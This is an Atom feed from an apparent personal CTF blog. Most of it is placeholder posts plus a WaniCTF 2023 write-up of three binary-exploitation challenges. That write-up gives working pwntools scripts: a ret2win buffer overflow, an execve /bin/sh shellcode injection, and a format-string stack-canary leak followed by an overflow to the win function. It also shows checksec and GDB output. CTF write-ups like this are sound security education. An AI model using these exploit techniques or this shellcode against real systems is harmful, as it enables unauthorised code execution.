<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-24T22:53:36+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">PWNC4M</title><subtitle>Made with ❤️ by giorgiosld</subtitle><entry><title type="html">BYU CTF</title><link href="http://localhost:4000/writeups/byuctf/byu-ctf/" rel="alternate" type="text/html" title="BYU CTF" /><published>2023-05-24T14:18:00+02:00</published><updated>2023-05-24T14:18:00+02:00</updated><id>http://localhost:4000/writeups/byuctf/byu-ctf</id><content type="html" xml:base="http://localhost:4000/writeups/byuctf/byu-ctf/"><![CDATA[<p>BYUCTF writeups <br />
<a href="/writeups/byuctf/web/web-directory">Forensics</a><br />
<a href="/writeups/byuctf/web/web-directory">Misc</a><br />
<a href="/writeups/byuctf/web/web-directory">Pentesting</a><br />
<a href="/writeups/byuctf/web/web-directory">Pwn</a><br />
<a href="/writeups/byuctf/web/web-directory">Rev</a><br /></p>]]></content><author><name></name></author><category term="writeups" /><category term="byuctf" /><summary type="html"><![CDATA[BYUCTF writeups Forensics Misc Pentesting Pwn Rev]]></summary></entry><entry><title type="html">First challenge</title><link href="http://localhost:4000/writeups/byuctf/web/firstchall/" rel="alternate" type="text/html" title="First challenge" /><published>2023-05-24T14:18:00+02:00</published><updated>2023-05-24T14:18:00+02:00</updated><id>http://localhost:4000/writeups/byuctf/web/firstchall</id><content type="html" xml:base="http://localhost:4000/writeups/byuctf/web/firstchall/"><![CDATA[<p>Questo è il writeup della prima chall</p>]]></content><author><name></name></author><category term="writeups" /><category term="byuctf" /><category term="web" /><summary type="html"><![CDATA[Questo è il writeup della prima chall]]></summary></entry><entry><title type="html">Web Byu CTF</title><link href="http://localhost:4000/writeups/byuctf/web/web-directory/" rel="alternate" type="text/html" title="Web Byu CTF" /><published>2023-05-24T14:18:00+02:00</published><updated>2023-05-24T14:18:00+02:00</updated><id>http://localhost:4000/writeups/byuctf/web/web-directory</id><content type="html" xml:base="http://localhost:4000/writeups/byuctf/web/web-directory/"><![CDATA[<p><br />
<a href="/writeups/byuctf/web/firstchall">first chall</a></p>]]></content><author><name></name></author><category term="writeups" /><category term="byuctf" /><category term="web" /><summary type="html"><![CDATA[first chall]]></summary></entry><entry><title type="html">WANI CTF</title><link href="http://localhost:4000/writeups/wanictf/wanictf/" rel="alternate" type="text/html" title="WANI CTF" /><published>2023-05-24T14:18:00+02:00</published><updated>2023-05-24T14:18:00+02:00</updated><id>http://localhost:4000/writeups/wanictf/wanictf</id><content type="html" xml:base="http://localhost:4000/writeups/wanictf/wanictf/"><![CDATA[<p>WANI CTf writeups <br />
<a href="/writeups/wanictf/pwn/">Pwn</a><br /></p>]]></content><author><name></name></author><category term="writeups" /><category term="wanictf" /><summary type="html"><![CDATA[WANI CTf writeups Pwn]]></summary></entry><entry><title type="html">PWN challenge</title><link href="http://localhost:4000/writeups/wanictf/pwn/" rel="alternate" type="text/html" title="PWN challenge" /><published>2023-05-24T14:18:00+02:00</published><updated>2023-05-24T14:18:00+02:00</updated><id>http://localhost:4000/writeups/wanictf/pwn</id><content type="html" xml:base="http://localhost:4000/writeups/wanictf/pwn/"><![CDATA[<h1 id="wani-ctf-2023">Wani CTF 2023</h1>

<h2 id="ret2win">ret2win</h2>

<p>This is a simple buffer overflow, the aim of this challenge is to jump to the win function.
The payload will be structured as follows:</p>
<blockquote>
  <p>Payload = PADDING + win_address()</p>
</blockquote>

<h3 id="exploit">Exploit</h3>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#r = process("./chall")
</span>
<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">ret2win-pwn.wanictf.org</span><span class="sh">"</span><span class="p">,</span> <span class="mi">9003</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">40</span>
<span class="n">win_function</span> <span class="o">=</span> <span class="mh">0x401369</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="n">offset</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">win_function</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="c1"># FLAG{f1r57_5739_45_4_9wn3r}</span></code></pre></figure>

<h2 id="shell-basic">shell-basic</h2>
<p>Simple shellcode injection</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/feedz/Desktop/waniCTF/waniCTF_2023/pwn-shell-basic/chall'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments</code></pre></figure>

<p>we can see that NX is disabled and that means we can go with shellcode injection.</p>

<h3 id="exploit-1">Exploit</h3>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">shell-basic-pwn.wanictf.org</span><span class="sh">"</span><span class="p">,</span> <span class="mi">9004</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="sh">"</span>
<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="c1"># FLAG{NXbit_Blocks_shellcode_next_step_is_ROP}</span></code></pre></figure>

<h2 id="canaleak">Canaleak</h2>

<p>the aim of this challenge is to leak the stack canary through format string vulnerability and then jump to the win function.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="nf">while </span><span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">nope</span><span class="p">,</span> <span class="sh">"</span><span class="s">YES</span><span class="sh">"</span><span class="p">))</span> <span class="p">{</span>
    <span class="nf">printf</span><span class="p">(</span><span class="sh">"</span><span class="s">You can</span><span class="sh">'</span><span class="s">t overwrite return address if canary is enabled.</span><span class="se">\n</span><span class="s">Do you </span><span class="sh">"</span>
           <span class="sh">"</span><span class="s">agree with me? : </span><span class="sh">"</span><span class="p">);</span>
    <span class="nf">scanf</span><span class="p">(</span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="p">,</span> <span class="n">nope</span><span class="p">);</span>
    <span class="nf">printf</span><span class="p">(</span><span class="n">nope</span><span class="p">);</span>
  <span class="p">}</span></code></pre></figure>

<p>the focus is to leak stuff from the stack through printf, as I said first this will help us to leak the stack canary.
we can try to fuzz the stack and try to identify the stack canary.
the stack canary end in 00.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">0: Do you agree with me? : %0<span class="nv">$p</span>
1: Do you agree with me? : 0xa
2: Do you agree with me? : <span class="o">(</span>nil<span class="o">)</span>
3: Do you agree with me? : 0x7f32a9619aa0
4: Do you agree with me? : <span class="o">(</span>nil<span class="o">)</span>
5: Do you agree with me? : 0x7fc3bb378040
6: Do you agree with me? : 0x70243625
7: Do you agree with me? : <span class="o">(</span>nil<span class="o">)</span>
8: Do you agree with me? : <span class="o">(</span>nil<span class="o">)</span>
9: Do you agree with me? : 0xef1553a888ae3b00
10: Do you agree with me? : 0x1
11: Do you agree with me? : 0x7fe97bc29d90
12: Do you agree with me? : <span class="o">(</span>nil<span class="o">)</span>
13: Do you agree with me? : 0x401254
14: Do you agree with me? : 0x100000000</code></pre></figure>

<p>we can see that in the first 15 occurrences only 1 ends with 00.
Number 9 is our candidate</p>

<p>Now let’s check better with GDB.</p>

<figure class="highlight"><pre><code class="language-gdb" data-lang="gdb">You can't overwrite return address if canary is enabled.
Do you agree with me? : %9$p
0xb2431c61d958e500

gef➤  canary
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L4935 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
[+] The canary of process 16904 is at 0x7fffffffe2b9, value is 0xb2431c61d958e500</code></pre></figure>

<p>yes, %9$p will be our stack canary.
let’s craft our payload:</p>
<blockquote>
  <p>Payload = buffer_padding + canary + padding_rbp + win_address</p>
</blockquote>

<p>Note that win fuction starts at 0x40123d but this function will push rbp on the stack, and this will dis-align the stack.
So we can pass 0x401245 directly, which is the syscall to /bin/sh.</p>

<figure class="highlight"><pre><code class="language-gdb" data-lang="gdb">gef➤  disas win
Dump of assembler code for function win:
   0x000000000040123d &lt;+0&gt;:	endbr64 
   0x0000000000401241 &lt;+4&gt;:	push   rbp
   0x0000000000401242 &lt;+5&gt;:	mov    rbp,rsp
   0x0000000000401245 &lt;+8&gt;:	lea    rdi,[rip+0xdbc]        # 0x402008
   0x000000000040124c &lt;+15&gt;:	call   0x4010d0 &lt;system@plt&gt; 
   0x0000000000401251 &lt;+20&gt;:	nop
   0x0000000000401252 &lt;+21&gt;:	pop    rbp
   0x0000000000401253 &lt;+22&gt;:	ret    
End of assembler dump.</code></pre></figure>

<p>the stack alignment will look something like this:</p>

<figure class="highlight"><pre><code class="language-gdb" data-lang="gdb">0x007ffc9282ce08│+0x0008: "AAAAAAAAAAAAAAAA"
0x007ffc9282ce10│+0x0010: "AAAAAAAA"
0x007ffc9282ce18│+0x0018: 0x338641c2c0127900
0x007ffc9282ce20│+0x0020: 0x4242424242424242	 ← $rbp
0x007ffc9282ce28│+0x0028: 0x00000000401245  →  &lt;win+8&gt; lea rdi, [rip+0xdbc]        # 0x402008</code></pre></figure>

<p>just run the exploit and get the flag!</p>

<h3 id="exploit-2">Exploit</h3>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./chall</span><span class="sh">"</span><span class="p">)</span>
<span class="c1">#r = remote("canaleak-pwn.wanictf.org",9006)
</span><span class="n">r</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">You can</span><span class="sh">'</span><span class="s">t overwrite return address if canary is enabled.</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">%9$p</span><span class="sh">"</span><span class="p">)</span>  <span class="c1"># canary leak
</span><span class="n">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Canary: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">24</span>  <span class="c1"># padding for buffer
</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>  <span class="c1"># canary
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span>  <span class="c1"># padding to rbp
</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x401245</span><span class="p">)</span>  <span class="c1"># addr load rdi
</span><span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="sh">'</span><span class="s">b *0x4012e8</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># dove viene fatto il controllo per il canary
</span>
<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s"> : </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">YES</span><span class="sh">"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="c1"># FLAG{N0PE!}</span></code></pre></figure>]]></content><author><name></name></author><category term="writeups" /><category term="wanictf" /><summary type="html"><![CDATA[Wani CTF 2023]]></summary></entry><entry><title type="html">Welcome to PWNC4M!</title><link href="http://localhost:4000/jekyll/update/welcome-to-jekyll/" rel="alternate" type="text/html" title="Welcome to PWNC4M!" /><published>2023-05-17T12:31:46+02:00</published><updated>2023-05-17T12:31:46+02:00</updated><id>http://localhost:4000/jekyll/update/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/welcome-to-jekyll/"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>

<p>Jekyll requires blog post files to be named according to the following format:</p>

<p><code class="language-plaintext highlighter-rouge">YEAR-MONTH-DAY-title.MARKUP</code></p>

<p>Where <code class="language-plaintext highlighter-rouge">YEAR</code> is a four-digit number, <code class="language-plaintext highlighter-rouge">MONTH</code> and <code class="language-plaintext highlighter-rouge">DAY</code> are both two-digit numbers, and <code class="language-plaintext highlighter-rouge">MARKUP</code> is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>

<p>Jekyll also offers powerful support for code snippets:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
  <span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>

<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry></feed>